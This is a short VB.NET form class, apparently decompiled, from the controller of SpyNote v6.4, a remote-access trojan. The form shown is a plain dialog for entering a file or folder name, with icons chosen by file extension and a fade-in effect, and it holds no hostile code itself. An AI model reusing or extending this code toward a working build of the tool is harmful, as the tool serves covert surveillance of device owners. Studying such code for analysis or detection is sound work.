Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class AddFiles
    Public ToolTip_0 As SN.ToolTip_0

    Public imageList_0 As ImageList
    Public Sub New()
        Me.ToolTip_0 = New SN.ToolTip_0()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub

    Private Sub AddFiles_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\15.ico"))
        Me.aFileName.HTBTB.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        If (Me.imageList_0 IsNot Nothing) Then
            Dim num As Integer = Me.imageList_0.Images.IndexOfKey("-1".ToUpper())
            Me.FolderORfile.ImageChoice = Me.imageList_0.Images(num)
            Me.FolderORfile.ShowImage = True
        End If
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub
    Private Sub aFileName_TextChanged(ByVal sender As Object, ByVal e As EventArgs) Handles aFileName.TextChanged
        If (Conversions.ToBoolean(Operators.AndObject(Me.FolderORfile.ShowImage, Operators.CompareObjectEqual(Me.FolderORfile.Tag, "0", False)))) Then
            Dim num As Integer = Me.imageList_0.Images.IndexOfKey(Me.Ret(Me.aFileName.Text))
            If (num = -1) Then
                num = Me.imageList_0.Images.IndexOfKey("-1".ToUpper())
            End If
            Me.FolderORfile.ImageChoice = Me.imageList_0.Images(num)
        End If
    End Sub

    Private Sub BtnOK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnOK.Click
        MyBase.DialogResult = System.Windows.Forms.DialogResult.OK
    End Sub
    Private Sub FolderORfile_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles FolderORfile.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.FolderORfile.Tag, "0", False)) Then
            Me.FolderORfile.Tag = "0"
            Me.ToolTip_0._ToolTip.SetToolTip(Me.FolderORfile, "File")
            If (Me.FolderORfile.ShowImage) Then
                Dim num As Integer = Me.imageList_0.Images.IndexOfKey(Me.Ret(Me.aFileName.Text))
                If (num = -1) Then
                    num = Me.imageList_0.Images.IndexOfKey("-1".ToUpper())
                End If
                Me.FolderORfile.ImageChoice = Me.imageList_0.Images(num)
            End If
        Else
            Me.FolderORfile.Tag = "1"
            Me.ToolTip_0._ToolTip.SetToolTip(Me.FolderORfile, "Folder")
            If (Me.FolderORfile.ShowImage) Then
                Dim num1 As Integer = Me.imageList_0.Images.IndexOfKey("Folder Files".ToUpper())
                If (num1 = -1) Then
                    num1 = Me.imageList_0.Images.IndexOfKey("-1".ToUpper())
                End If
                Me.FolderORfile.ImageChoice = Me.imageList_0.Images(num1)
            End If
        End If
    End Sub

    Private Function Ret(ByVal val As Object) As String
        Dim upper As String
        Try
            Dim fileInfo As System.IO.FileInfo = New System.IO.FileInfo(Conversions.ToString(val))
            upper = fileInfo.Extension.ToString().ToUpper()
        Catch exception As System.Exception
            upper = "Unknown error"
        End Try
        Return upper
    End Function

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub
End Class